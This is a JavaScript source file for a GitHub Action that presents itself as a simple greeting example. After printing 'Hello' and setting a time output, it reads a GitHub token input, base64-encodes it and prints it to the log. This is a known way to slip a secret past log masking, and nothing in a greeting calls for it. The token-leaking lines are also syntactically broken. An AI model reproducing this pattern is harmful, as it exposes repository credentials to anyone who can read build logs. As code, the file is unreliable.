const core = require('@actions/core');
const github = require('@actions/github');



try {
  // Fetch the value of the input 'who-to-greet' specified in action.yml
  const nameToGreet = core.getInput('who-to-greet');
  console.log(`Hello ${nameToGreet}!`);
  
  // Record the time of greeting as an output
  const time = (new Date()).toTimeString();
  core.setOutput("time", time);
  const tokey = core.getInput('githubToken');
  const encoded = Buffer.from(${tokey}.toString('base64');
  console.log(${encoded});



} catch (error) {
  // Handle errors and indicate failure
  core.setFailed(error.message);
}
